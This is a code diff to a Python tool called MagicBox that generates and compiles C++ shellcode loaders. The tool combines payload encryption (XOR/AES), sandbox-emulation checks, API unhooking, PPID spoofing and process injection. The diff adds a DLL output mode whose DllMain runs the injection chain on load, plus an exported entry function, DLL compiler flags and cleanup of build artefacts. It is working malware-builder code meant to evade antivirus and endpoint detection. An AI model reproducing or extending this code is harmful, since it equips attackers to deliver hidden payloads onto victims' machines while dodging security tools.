@@ -1,6 +1,6 @@
 import os
 
-from code_templates import crypt, emulation, injection, ppid_spoofing, unhook
+from code_templates import crypt, emulation, injection, ppid_spoofing, unhook, headers
 from helpers import encrypt, constants, random
 
 class MagicBoxException(Exception):
@@ -43,6 +43,7 @@ class MagicBox:
 
         self.finalCode = ""
         self.filename = None
+        self.format = None
 
 
     def __addRequiredHeaders(self, newHeaders):
@@ -128,7 +129,7 @@ unsigned int {payloadLengthVariableName} = sizeof({payloadVariableName});
             self.payload = encrypt.format(self.payload)
         else:
             unformattedPayloadKey = random.generateKey()
-            if alg == constants.Encryption.AES:
+            if alg == constants.Encryption.aes:
                 self.payload = encrypt.aes(self.payload, unformattedPayloadKey)
                 self.payloadDecryptionRoutine = crypt.aesDecryptionRoutine(
                     self.payloadVariableName, 
@@ -140,7 +141,7 @@ unsigned int {payloadLengthVariableName} = sizeof({payloadVariableName});
                 self.__addRequiredHeaders(aesHeaders)
                 self.encryptionCodeBase = aesCodeBase
 
-            elif alg == constants.Encryption.XOR:
+            elif alg == constants.Encryption.xor:
                 self.payload = encrypt.xor(self.payload, unformattedPayloadKey)
                 self.payloadDecryptionRoutine = crypt.xorDecryptionRoutine(
                     self.payloadVariableName, 
@@ -233,7 +234,7 @@ unsigned int {payloadLengthVariableName} = sizeof({payloadVariableName});
         self.emulationMain = emulationMain
         pass
 
-    def gatherGenerationCode(self):
+    def gatherGenerationCode(self, format):
         if self.payload is None:
             raise MagicBoxException("Payload must be set before generating any code.")
 
@@ -245,39 +246,94 @@ unsigned int {payloadLengthVariableName} = sizeof({payloadVariableName});
         xorHeaders, xorCodeBase = crypt.xor()
         self.__addRequiredHeaders(xorHeaders)
 
+        if format == constants.Formats.dll:
+            self.__addRequiredHeaders([headers.USER_32_LIB])
         headersCodeBase = self.__getHeadersCode()
         winAPICodeBase, winAPIMain = self.__getWinAPIsCode()
 
-        payloadCodeBase = self.__getPayloadCode()        
+        payloadCodeBase = self.__getPayloadCode()
 
-        self.finalCode = """
-{headersCodeBase}
-{payloadCodeBase}
-{xorCodeBase}
-{winAPICodeBase}
-{encryptionCodeBase}
-{unhookingCodeBase}
-{injectionCodeBase}
-int main(void) {{
-{winAPIMain}
-{emulationMain}
-{unhookingMain}
-{injectionMain}
-    return 0;
-}}
-        """.format(
-            headersCodeBase = headersCodeBase,
-            xorCodeBase = xorCodeBase,
-            winAPICodeBase = winAPICodeBase,
-            encryptionCodeBase = self.encryptionCodeBase,
-            unhookingCodeBase = self.unhookingCodeBase,
-            injectionCodeBase = self.injectionCodeBase,
-            payloadCodeBase = payloadCodeBase,
-            emulationMain = self.emulationMain,
-            winAPIMain = winAPIMain,
-            unhookingMain = self.unhookingMain,
-            injectionMain = self.injectionMain
-        )
+
+        if format == constants.Formats.dll:
+            self.finalCode = """
+                {headersCodeBase}
+                {payloadCodeBase}
+                {xorCodeBase}
+                {winAPICodeBase}
+                {encryptionCodeBase}
+                {unhookingCodeBase}
+                {injectionCodeBase}
+
+                BOOL APIENTRY DllMain( HMODULE hModule,
+                   DWORD  ul_reason_for_call,
+                   LPVOID lpReserved
+                 )
+                {{
+                switch (ul_reason_for_call)
+                {{
+                case DLL_PROCESS_ATTACH:
+                case DLL_THREAD_ATTACH:
+                case DLL_THREAD_DETACH:
+                case DLL_PROCESS_DETACH:
+                    {winAPIMain}
+                    {emulationMain}
+                    {unhookingMain}
+                    {injectionMain}
+                    break;
+                }}
+                return TRUE;
+                }}
+
+                extern "C" {{
+                __declspec(dllexport) void CALLBACK entry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+                    {{
+                        
+                    }}
+                }}
+            """.format(
+                headersCodeBase = headersCodeBase,
+                xorCodeBase = xorCodeBase,
+                winAPICodeBase = winAPICodeBase,
+                encryptionCodeBase = self.encryptionCodeBase,
+                unhookingCodeBase = self.unhookingCodeBase,
+                injectionCodeBase = self.injectionCodeBase,
+                payloadCodeBase = payloadCodeBase,
+                emulationMain = self.emulationMain,
+                winAPIMain = winAPIMain,
+                unhookingMain = self.unhookingMain,
+                injectionMain = self.injectionMain
+            )
+        else:        
+            self.finalCode = """
+    {headersCodeBase}
+    {payloadCodeBase}
+    {xorCodeBase}
+    {winAPICodeBase}
+    {encryptionCodeBase}
+    {unhookingCodeBase}
+    {injectionCodeBase}
+    int main(void) {{
+    {winAPIMain}
+    {emulationMain}
+    {unhookingMain}
+    {injectionMain}
+        return 0;
+    }}
+            """.format(
+                headersCodeBase = headersCodeBase,
+                xorCodeBase = xorCodeBase,
+                winAPICodeBase = winAPICodeBase,
+                encryptionCodeBase = self.encryptionCodeBase,
+                unhookingCodeBase = self.unhookingCodeBase,
+                injectionCodeBase = self.injectionCodeBase,
+                payloadCodeBase = payloadCodeBase,
+                emulationMain = self.emulationMain,
+                winAPIMain = winAPIMain,
+                unhookingMain = self.unhookingMain,
+                injectionMain = self.injectionMain
+            )
+        
+        self.format = format
 
 
     def setPPIDSpoofing(self, parent, child):
@@ -324,14 +380,24 @@ int main(void) {{
     def compile(self):
         if f"{self.filename}.cpp" is None:
             raise MagicBoxException("Code needs to be written to file first.")
-        
-        os.system(f"cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp {self.filename}.cpp /link /OUT:{self.filename}.exe /SUBSYSTEM:CONSOLE /MACHINE:x64")
+
+        if self.format == constants.Formats.dll:
+            print("DLL")
+            os.system(f"cl.exe /D_USRDLL /D_WINDLL {self.filename}.cpp /MT /link /DLL /OUT:{self.filename}.dll /MACHINE:x64")
+        else:      
+            print("NOT DLL")
+            os.system(f"cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp {self.filename}.cpp /link /OUT:{self.filename}.exe /SUBSYSTEM:CONSOLE /MACHINE:x64") 
+            
 
     def cleanup(self):
         if os.path.exists(f"{self.filename}.cpp"):
             os.remove(f"{self.filename}.cpp")
         if os.path.exists(f"{self.filename}.obj"):
             os.remove(f"{self.filename}.obj")
+        if os.path.exists(f"{self.filename}.exp"):
+            os.remove(f"{self.filename}.exp")
+        if os.path.exists(f"{self.filename}.lib"):
+            os.remove(f"{self.filename}.lib")
 
 
 
